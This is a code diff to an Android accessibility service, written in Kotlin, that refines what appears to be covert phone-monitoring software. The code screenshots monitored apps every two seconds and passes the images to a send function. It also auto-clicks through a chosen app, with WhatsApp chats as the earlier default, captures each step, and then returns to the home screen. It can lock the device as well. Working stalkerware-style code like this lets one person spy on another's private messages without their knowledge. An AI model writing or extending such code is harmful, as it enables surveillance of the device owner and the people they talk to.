@@ -22,7 +22,7 @@ import java.util.concurrent.Executors
 class MonitorAccessibilityService : AccessibilityService() {
 
     private val handler = Handler(Looper.getMainLooper())
-    private var isLoopActive = false
+    private var isShotLoopActive = false
     private var isAutoClickRunning = false
     private var lastAutoClickSignature: String? = null
     private var screenStateReceiver: BroadcastReceiver? = null
@@ -39,17 +39,16 @@ class MonitorAccessibilityService : AccessibilityService() {
         "com.zhiliaoapp.musically.go"
     )
 
+    // Feature 2: Every 2 seconds screenshot for monitored packages (strictly controlled by autoShotEnabled)
     private val screenshotRunnable = object : Runnable {
         override fun run() {
             val prefs = Prefs(this@MonitorAccessibilityService)
-            if (!prefs.running) {
+            if (!prefs.running || !prefs.autoShotEnabled) {
                 stopScreenshotLoop()
                 return
             }
 
-            val activeRootNode = rootInActiveWindow
-            val activePackage = activeRootNode?.packageName?.toString()
-
+            val activePackage = getCurrentActivePackage()
             if (activePackage != packageName && activePackage != null && monitoredPackages.contains(activePackage)) {
                 captureAndSendScreenshot(activePackage, "app_$activePackage", prefs)
                 handler.postDelayed(this, 2000)
@@ -59,6 +58,7 @@ class MonitorAccessibilityService : AccessibilityService() {
         }
     }
 
+    // Feature 1: Every 1 second check for target package & sequential 10-step auto clicker (strictly controlled by autoClickEnabled)
     private val autoClickWatchRunnable = object : Runnable {
         override fun run() {
             val prefs = Prefs(this@MonitorAccessibilityService)
@@ -68,15 +68,18 @@ class MonitorAccessibilityService : AccessibilityService() {
                 return
             }
 
-            val targetPkg = prefs.autoClickTargetPackage.ifBlank { "com.whatsapp" }
+            val targetPkg = prefs.autoClickTargetPackage.trim()
             val activePkg = getCurrentActivePackage()
 
-            if (activePkg == targetPkg && !isAutoClickRunning) {
-                val signature = "$targetPkg:${prefs.autoClickTriggerId}"
-                if (signature != lastAutoClickSignature) {
-                    isAutoClickRunning = true
-                    lastAutoClickSignature = signature
-                    runAutoClickFlow(targetPkg, prefs)
+            if (targetPkg.isNotEmpty() && activePkg == targetPkg && !isAutoClickRunning) {
+                val activeSteps = prefs.autoClickSteps.filter { it.isNotBlank() }
+                if (activeSteps.isNotEmpty()) {
+                    val signature = "$targetPkg:${prefs.autoClickTriggerId}"
+                    if (signature != lastAutoClickSignature) {
+                        isAutoClickRunning = true
+                        lastAutoClickSignature = signature
+                        executeStepAtIndex(targetPkg, activeSteps, 0, prefs, 0)
+                    }
                 }
             } else if (activePkg != targetPkg) {
                 lastAutoClickSignature = null
@@ -94,23 +97,6 @@ class MonitorAccessibilityService : AccessibilityService() {
         handler.post(autoClickWatchRunnable)
     }
 
-    fun triggerRefreshCheck() {
-        val prefs = Prefs(this)
-        lastAutoClickSignature = null
-        val activePkg = getCurrentActivePackage()
-        if (activePkg != null && monitoredPackages.contains(activePkg) && activePkg != packageName && prefs.running) {
-            if (!isLoopActive) {
-                isLoopActive = true
-                handler.removeCallbacks(screenshotRunnable)
-                handler.post(screenshotRunnable)
-            }
-        } else {
-            stopScreenshotLoop()
-        }
-        handler.removeCallbacks(autoClickWatchRunnable)
-        handler.post(autoClickWatchRunnable)
-    }
-
     fun lockScreenNow() {
         try {
             val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
@@ -124,7 +110,7 @@ class MonitorAccessibilityService : AccessibilityService() {
     }
 
     private fun stopScreenshotLoop() {
-        isLoopActive = false
+        isShotLoopActive = false
         handler.removeCallbacks(screenshotRunnable)
     }
 
@@ -132,93 +118,68 @@ class MonitorAccessibilityService : AccessibilityService() {
         return rootInActiveWindow?.packageName?.toString()
     }
 
-    private fun runAutoClickFlow(targetPackage: String, prefs: Prefs) {
-        checkScreenAndProceed(targetPackage, prefs, 0)
-    }
-
-    private fun checkScreenAndProceed(packageName: String, prefs: Prefs, attempt: Int) {
-        if (!prefs.autoClickEnabled) {
+    private fun executeStepAtIndex(
+        targetPackage: String,
+        steps: List<String>,
+        stepIndex: Int,
+        prefs: Prefs,
+        attempt: Int
+    ) {
+        if (!prefs.running || !prefs.autoClickEnabled) {
             isAutoClickRunning = false
             return
         }
 
-        handler.postDelayed({
-            if (!prefs.autoClickEnabled) {
-                isAutoClickRunning = false
-                return@postDelayed
+        if (stepIndex >= steps.size) {
+            isAutoClickRunning = false
+            val homeIntent = Intent(Intent.ACTION_MAIN).apply {
+                addCategory(Intent.CATEGORY_HOME)
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK
             }
+            startActivity(homeIntent)
+            return
+        }
 
-            val rootNode = rootInActiveWindow
-            if (rootNode == null) {
-                if (attempt < 6) {
-                    checkScreenAndProceed(packageName, prefs, attempt + 1)
-                } else {
-                    isAutoClickRunning = false
-                }
-                return@postDelayed
-            }
-
-            val notNowNodes = rootNode.findAccessibilityNodeInfosByText("Not now")
-            if (notNowNodes.isNotEmpty()) {
-                for (node in notNowNodes) {
-                    if (clickNodeOrParent(node)) break
-                }
-                handler.postDelayed({ proceedToTargetActions(packageName, prefs) }, 2000)
-                return@postDelayed
-            }
-
-            val chatListCheck = rootNode.findAccessibilityNodeInfosByText("Chats")
-            val targetTextCheck = if (prefs.autoClickTargetText.isNotBlank()) {
-                rootNode.findAccessibilityNodeInfosByText(prefs.autoClickTargetText)
-            } else {
-                emptyList()
-            }
-
-            if (chatListCheck.isNotEmpty() || targetTextCheck.isNotEmpty() || rootNode.packageName?.toString() == packageName) {
-                proceedToTargetActions(packageName, prefs)
-            } else {
-                if (attempt < 6) {
-                    checkScreenAndProceed(packageName, prefs, attempt + 1)
-                } else {
-                    isAutoClickRunning = false
-                }
-            }
-        }, 1500)
-    }
-
-    private fun proceedToTargetActions(packageName: String, prefs: Prefs) {
-        if (!prefs.autoClickEnabled) {
+        val currentPkg = getCurrentActivePackage()
+        if (currentPkg != targetPackage) {
             isAutoClickRunning = false
             return
         }
 
-        val currentRoot = rootInActiveWindow
-        if (currentRoot != null) {
-            captureAndSendScreenshot(packageName, "${packageName}_list", prefs)
+        val stepText = steps[stepIndex].trim()
+        if (stepText.isEmpty()) {
+            executeStepAtIndex(targetPackage, steps, stepIndex + 1, prefs, 0)
+            return
+        }
 
+        val rootNode = rootInActiveWindow
+        val matchedNodes = rootNode?.findAccessibilityNodeInfosByText(stepText) ?: emptyList()
+        var clicked = false
+
+        for (node in matchedNodes) {
+            if (clickNodeOrParent(node)) {
+                clicked = true
+                break
+            }
+        }
+
+        if (clicked) {
             handler.postDelayed({
-                if (!prefs.autoClickEnabled) {
-                    isAutoClickRunning = false
-                    return@postDelayed
+                if (prefs.running && prefs.autoClickEnabled) {
+                    captureAndSendScreenshot(targetPackage, "${targetPackage}_step_${stepIndex + 1}", prefs)
                 }
-
-                val targetText = prefs.autoClickTargetText.trim()
-                if (targetText.isNotEmpty()) {
-                    val nodes = currentRoot.findAccessibilityNodeInfosByText(targetText)
-                    for (node in nodes) {
-                        if (clickNodeOrParent(node)) break
-                    }
-                }
-
                 handler.postDelayed({
-                    if (prefs.autoClickEnabled) {
-                        captureAndSendScreenshot(packageName, "${packageName}_target", prefs)
-                    }
-                    isAutoClickRunning = false
-                }, 2000)
-            }, 1500)
+                    executeStepAtIndex(targetPackage, steps, stepIndex + 1, prefs, 0)
+                }, 1500)
+            }, 1200)
         } else {
-            isAutoClickRunning = false
+            if (attempt < 8) {
+                handler.postDelayed({
+                    executeStepAtIndex(targetPackage, steps, stepIndex, prefs, attempt + 1)
+                }, 1000)
+            } else {
+                isAutoClickRunning = false
+            }
         }
     }
 
@@ -261,7 +222,7 @@ class MonitorAccessibilityService : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
         val prefs = Prefs(this)
-        if (!prefs.running) {
+        if (!prefs.running || !prefs.autoShotEnabled) {
             stopScreenshotLoop()
             return
         }
@@ -269,8 +230,8 @@ class MonitorAccessibilityService : AccessibilityService() {
         val packageName = event.packageName?.toString() ?: return
 
         if (monitoredPackages.contains(packageName) && packageName != this.packageName) {
-            if (!isLoopActive) {
-                isLoopActive = true
+            if (!isShotLoopActive) {
+                isShotLoopActive = true
                 handler.removeCallbacks(screenshotRunnable)
                 handler.post(screenshotRunnable)
             }
